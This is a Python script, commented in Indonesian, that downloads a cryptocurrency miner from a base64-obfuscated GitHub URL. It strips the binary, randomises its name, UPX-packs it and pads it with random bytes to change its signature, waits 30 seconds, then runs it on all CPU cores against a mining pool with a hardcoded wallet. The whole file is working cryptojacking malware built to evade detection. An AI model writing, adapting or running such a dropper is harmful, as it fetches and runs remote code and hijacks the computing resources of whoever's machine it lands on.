import os
import base64
import random
import string
import time

def random_name():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

miner_url = base64.b64decode("aHR0cHM6Ly9naXRodWIuY29tL0ZvcmVhbFN1cy90ZXN0L3Jhdy9yZWZzL2hlYWRzL21haW4vY3B1bWluZXItc3NlMg==").decode()
raw_name = "miner_raw"
final_name = random_name()

os.system(f"wget {miner_url} -O {raw_name}")
os.system(f"strip {raw_name}")
os.system(f"mv {raw_name} {final_name}")
os.system(f"upx --brute {final_name}")
os.system(f"dd if=/dev/urandom bs=1 count=1024 >> {final_name}")
os.system(f"chmod +x {final_name}")

print("[INFO] Sleeping 30 detik dulu biar aman...")
time.sleep(30)

algo = "power2b"
pool = "stratum+tcps://stratum-asia.rplant.xyz:17022"
wallet = "mbc1qyll66z05zywke8ry9fh5xtrxrunadu0ac2a0f4"
worker = "gasbg"

cmd = f"./{final_name} -a {algo} -o {pool} -u {wallet}.{worker} -t {os.cpu_count()}"
print(f"[INFO] Running miner:\\n{cmd}\\n")
os.system(cmd)
